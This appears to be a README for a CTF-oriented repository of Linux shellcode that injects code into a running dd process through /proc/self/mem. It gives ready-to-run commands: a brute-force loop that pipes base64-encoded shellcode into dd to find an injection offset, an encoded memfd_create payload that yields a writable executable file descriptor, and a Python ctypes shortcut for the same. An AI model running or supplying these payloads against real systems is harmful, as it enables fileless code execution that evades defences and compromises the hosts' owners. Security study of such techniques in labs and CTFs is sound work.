# Shellcodes developed for exploiting dd

This is based on the article: [Pure In-Memory (Shell)Code Injection In Linux Userland](https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md). Please read it to properly understand what is happening.

The only difference in this work is that instead of manually selecting
the injection point, a trial and error approach is used. This is much
nosier as it generates lots of segfaults, but fine for CTFs.

The below files are in the repo:

* hello.S

    * is just a trivial "hello world" for testing build system

* hello-with-dup.S

    * uses dup2 to copy fd 33 to fd 0 and fd 34 to fd 1
    * this is required as dd will probably have closed/remapped rd 0 and 1
    * primary purpose of this shell code is to identify an injection point in dd
    * typically used as (with the correct offset will print "Hello World":
    
        ```
        $ dd if=hello-with-dup.bin of=/proc/self/mem bs=1 seek=??? conv=notrunc status=none 33<&0 34>&1
        ```

* memfd.S

    * only creates a memmapped fd and then pauses
    * its smallher than hello-with-dup.S so if hello-with-dup.S works, this can be put in-situ


## Usage:

1. build the hello-with-dup.bin shell code:

    ```
    $ make hello-with-dup.bin
    ```

    On the target system, run dd
    ```
    $ dd if=/proc/self/maps status=none | grep xp
    00400000-00411000 r-xp 00000000 fd:00 265421                             /bin/dd
    7fa964acf000-7fa964c8f000 r-xp 00000000 fd:00 269671                     /lib/x86_64-linux-gnu/libc-2.23.so
    7fa964e99000-7fa964ebf000 r-xp 00000000 fd:00 269649                     /lib/x86_64-linux-gnu/ld-2.23.so
    7fffd8d43000-7fffd8d45000 r-xp 00000000 00:00 0                          [vdso]
    ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
    ```

    Here the first line shows the executable region.
    * use setarch to disable aslr if needed

    If needed, increase the size of the shellcode inscase of looking to inject larger ones.
    * i.e. use `truncate -s ??? hello-with-dup.bin`

2. Find offset

    Then, using the executable region of dd search over the process space for injection point:

    ```
    $ for x in {4194304..4263936} ; do echo trying $x ; if echo '6AAAAABbuCEAAACJxzH2DwWJ+P/H/8YPBYnHSIneSIHGMAAAALoMAAAADwW4PAAAADH/DwVIZWxsbyBXb3JsZAo=' | base64 -d | dd of=/proc/self/mem bs=1 seek=${x} conv=notrunc status=none 33<&0 34>&1 2>/dev/null | grep Hello ; then echo done $x;  break ; fi ; done
    ```

    On some systems its will pause on some sizes and need to be manuall killed and continued from next index.


3. Inject

    Once this finds the offset, its a simple matter to inject a useful shell code.

    Below shows memfd.S

    ```
    $ make memfd.bin
    $ base64 -w 0 memfd.bin
    6AAAAABfuD8BAABIgccYAAAAMfYPBbgiAAAADwVGSUxFAA==
    ```

    Update below with offset obtained from step 2
    ```
    $ echo '6AAAAABfuD8BAABIgccYAAAAMfYPBbgiAAAADwVGSUxFAA==' | base64 -d | dd of=/proc/self/mem bs=1 seek=??? conv=notrunc status=none
    ```

    This should now hang.
    * suspend (CTRL-Z) dd
    * look int the `/proc/???/fd` for dd
    * there should be a writable/executable file owned by current user

## Conclusions

On many systems, all this is not necessary to exploit `dd` providing
there is a recent `libc` (greater >= 2.27) and python available.

In these cases, its possible to use types `ctypes` python module to
directly call `memfd_create` syscall.

E.g.:

```
In [1]: from ctypes import *
In [2]: libc = cdll.LoadLibrary("libc.so.6")

In [3]: libc.memfd_create
Out[3]: <_FuncPtr object at 0x7fe2789c5e80>

In [4]: libc.memfd_create("FILE", 0)
Out[4]: 17
```

## Other bits

Copyright Karim Kanso 2020. All rights reserved. Work licensed under GPLv3.
